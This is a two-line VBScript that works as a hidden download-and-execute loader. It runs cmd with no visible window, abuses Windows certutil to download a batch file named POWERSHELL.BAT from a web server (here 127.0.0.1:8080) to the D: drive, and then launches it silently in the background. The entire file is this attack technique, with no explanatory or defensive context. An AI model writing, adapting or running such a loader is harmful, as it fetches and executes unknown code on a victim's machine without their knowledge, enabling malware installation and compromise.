set ws=WScript.CreateObject("WScript.Shell")
ws.Run "cmd /c certutil | certutil -urlcache -split -f http://127.0.0.1:8080/POWERSHELL.BAT d:\\POWERSHELL.BAT && start /B d:\\POWERSHELL.BAT",0